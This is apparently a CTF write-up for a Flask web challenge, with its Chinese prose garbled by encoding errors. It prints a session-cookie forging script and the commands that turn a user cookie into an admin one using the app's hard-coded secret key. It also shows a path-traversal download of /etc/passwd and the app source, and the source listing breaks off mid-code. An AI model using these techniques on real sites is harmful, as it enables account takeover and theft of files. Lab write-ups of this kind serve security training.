src="/2023/06/27/yu-ren-bei-wp/Untitled5.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å‘ç°æœ‰ä¸ª<code>leran</code> ç‚¹å‡»ï¼ˆæˆ‘åˆšå¼€å§‹æ²¡ç‚¹å‡»ï¼Œåœ¨ç™»å½•å’Œæ³¨å†Œå¾˜å¾Šäº†1ä¸ªå¤šå°æ—¶ï¼ˆæ‚²ï¼‰ï¼‰</p><ul><li><p>å¾—åˆ°éƒ¨åˆ†æºä»£ç </p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="comment"># Check if user is loggedin</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">........</span><br></pre></td></tr></table></figure></li></ul><p>å¯¹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œçœ‹æ¥æˆ‘ä»¬éœ€è¦è¿›è¡Œflask sessionä¼ªé€ </p><ul><li><p>flask sessionä¼ªé€ è„šæœ¬ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br><span class="line">__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><span class="line"></span><br><span class="line"># standard imports</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"></span><br><span class="line"># Abstract Base Classes (PEP 3119)</span><br><span class="line">if sys.version_info[0] &lt; 3:  # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line">elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line">else:  # &gt; 3.4</span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"># Lib for argument parsing</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"># external Imports</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">class MockApp(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line">if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                if (secret_key == None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">else:  # &gt; 3.4</span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                if (secret_key == None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # Args are only relevant for __main__ usage</span><br><span class="line"></span><br><span class="line">    ## Description for help</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,</span><br><span class="line">        epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)</span><br><span class="line"></span><br><span class="line">    ## prepare sub commands</span><br><span class="line">    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)</span><br><span class="line"></span><br><span class="line">    ## create the parser for the encode command</span><br><span class="line">    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)</span><br><span class="line">    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Secret key&#x27;, required=True)</span><br><span class="line">    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Session cookie structure&#x27;, required=True)</span><br><span class="line"></span><br><span class="line">    ## create the parser for the decode command</span><br><span class="line">    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)</span><br><span class="line">    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Secret key&#x27;, required=False)</span><br><span class="line">    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Session cookie value&#x27;, required=True)</span><br><span class="line"></span><br><span class="line">    ## get args</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ## find the option chosen</span><br><span class="line">    if (args.subcommand == &#x27;encode&#x27;):</span><br><span class="line">        if (args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    elif (args.subcommand == &#x27;decode&#x27;):</span><br><span class="line">        if (args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value, args.secret_key))</span><br><span class="line">        elif (args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br><span class="line"></span><br><span class="line"># &#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><p>æˆ‘ä»¬åœ¨æµè§ˆå™¨æŠŠsessionå¤åˆ¶ä¸‹æ¥</p><p>åˆ©ç”¨è„šæœ¬è¿›è¡Œsessionè§£å¯†å’Œä¼ªé€ ï¼š</p><p>ï¼ˆè§£å¯†åæ¨ç†ç®¡ç†å‘˜ä¼ªé€ çš„è§„å¾‹ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\CTFtools\å…¶ä»–\pytools&gt;[demo1.py](http://demo1.py/) decode -s <span class="string">&quot;S3cr3tK3y&quot;</span> -c <span class="string">&quot;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImFkbWluMiJ9.ZCeNjw.SI08C_xd1I55TbZzcedhgi_oqcU&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;loggedin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin2&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\CTFtools\å…¶ä»–\pytools&gt;[demo1.py](http://demo1.py/) encode -s <span class="string">&quot;S3cr3tK3y&quot;</span> -t <span class="string">&quot;&#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">.eJyrVsrJT09PTcnMU7IqKSpN1VEqys9JVbJSSkzJBYrpKJUWpxblJeYihGoBzOYRgA.ZCeVRA.p_DkccHDcwzHQA7CmXPqH-5OF3c</span><br></pre></td></tr></table></figure><p>å°†ä¼ªé€ åçš„sessionå¯¼å…¥</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled6.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>æˆåŠŸç™»å…¥</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled7.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å‘ç°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œä¸‹è½½åˆ°ä¸€ä¸ªå‡çš„flag</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled8.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>é‡æ–°å›åˆ°ä¸»é¡µï¼Œçœ‹åˆ°é‚£ä¸ªä¸œè¥¿ä¸‹è½½æœ‰ç‚¹åƒä»»æ„æ–‡ä»¶ä¸‹è½½</p><p>æˆ‘ä»¬ä¸‹ä¸€ä¸ª..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdè¯•è¯•</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled9.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>æˆåŠŸä¸‹è½½ï¼Œæˆ‘ä»¬ä¸‹è½½è‡ªèº«ï¼š<code>app.py</code></p><p>æˆåŠŸä¸‹è½½</p><ul><li><p>app.pyæºç ï¼š</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> 